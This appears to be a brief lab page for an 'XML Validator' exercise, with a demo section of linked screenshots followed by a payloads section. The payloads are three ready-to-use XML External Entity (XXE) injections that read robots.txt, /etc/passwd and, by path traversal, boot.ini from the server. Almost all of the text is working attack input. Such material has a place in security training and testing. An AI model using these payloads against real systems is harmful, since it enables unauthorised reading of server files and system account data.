#### XML Validator

- Demo

![](images/1.png)

![](images/2.png)

![](images/3.png)

![](images/4.png)

![](images/5.png)

![](images/6.png)

![](images/7.png)

- Payloads

```xml
<?xml version="1.0"?>
<!DOCTYPE change-log [
<!ENTITY systemEntity SYSTEM "robots.txt">
]>
<change-log>
  <text>&systemEntity;</text>
</change-log>
```

```xml
<?xml version="1.0"?>
<!DOCTYPE change-log [
<!ENTITY systemEntity SYSTEM "/etc/passwd">
]>
<change-log>
  <text>&systemEntity;</text>
</change-log>
```

```xml
<?xml version="1.0"?>
<!DOCTYPE change-log [
<!ENTITY systemEntity SYSTEM "../../../../boot.ini">
]>
<change-log>
  <text>&systemEntity;</text>
</change-log>
```
